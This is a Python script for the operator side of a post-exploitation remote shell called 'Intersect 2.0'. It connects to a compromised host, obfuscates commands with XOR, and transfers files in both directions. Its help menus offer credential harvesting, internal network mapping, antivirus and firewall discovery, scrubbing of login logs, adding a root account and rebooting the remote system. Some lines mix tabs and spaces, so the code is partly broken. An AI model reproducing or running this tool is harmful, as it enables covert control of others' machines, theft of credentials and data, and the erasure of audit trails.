#!/usr/bin/python

# Intersect 2.0
# XOR Shell Client
# trial version. don't expect this to work all that well.

import os, sys
import socket
from subprocess import Popen,PIPE,STDOUT,call

def xor(string, key):
    data = ''
    for char in string:
        for ch in key:
            char = chr(ord(char) ^ ord(ch))
        data += char
    return data

socksize = 4096
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
try:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
	pin = sys.argv[3]

except IndexError:
    print("You must specify an IP address, port and XOR cipher key.")
    print("usage: ./tcp-client.py 192.168.1.4 4444 KEY")
    sys.exit()

try:
    conn.connect((HOST, PORT))
    print("[+] New connection established!")
    print("[+] Starting Intersecting shell....")
except:
    print("[!] Connection error!")
    sys.exit(2)


while True:
    data = conn.recv(socksize)
    data2 = xor(data, pin)
    msg = raw_input(data2)
    cmd = xor(msg, pin)
    conn.sendall(str(cmd))
    if msg == ('killme'):
        print("[!] Shutting down shell!")
        conn.close()
        sys.exit(0)
    elif msg.startswith('download'):
        getname = msg.split(" ")
        rem_file = getname[1]
        filename = rem_file.replace("/","_")
        data = conn.recv(socksize)
        filedata = xor(data, pin)
        newfile = file(filename, "wb")
        newfile.write(filedata)
        newfile.close()
        if os.path.exists(filename) is True:
            print("[+] Download complete.")
            print("[+] File location: " + os.getcwd()+"/"+filename)
    elif msg.startswith('upload'):
	getname = msg.split(" ")
        loc_file = getname[1]
        sendfile = open(loc_file, "r")
        filedata = sendfile.read()
        sendfile.close()
        senddata = xor(filedata, pin)
        conn.sendall(senddata)
    elif msg == ("extask"):
        print("   extask help menu    ")
        print("extask osinfo      | gather os info")
        print("extask livehosts   | maps internal network")
        print("extask credentials | user/sys credentials")
        print("extask findextras  | av/fw and extras")
        print("extask network     | ips, fw rules, connections, etc")
        print("extask scrub       | clears 'who' 'w' 'last' 'lastlog'")
    elif msg == ("helpme"):
	print(" Intersect XOR Shell | Help Menu")
	print("---------------------------------")
	print(" download <file>  | download file from host")
	print(" upload <file>    | upload file to host")
	print(" extask <task>    | run Intersect tasks")
	print(" httproxy         | HTTP proxy on 8080")
	print(" adduser <name>   | add new root account")
	print(" rebootsys        | reboot remote host system")
	print(" helpme           | display this menu")
	print(" killme           | shuts down shell connection\n")
	print("* If the shell appears to hang after sending or receiving data, press [enter] and it should fix the issue.")

conn.close()

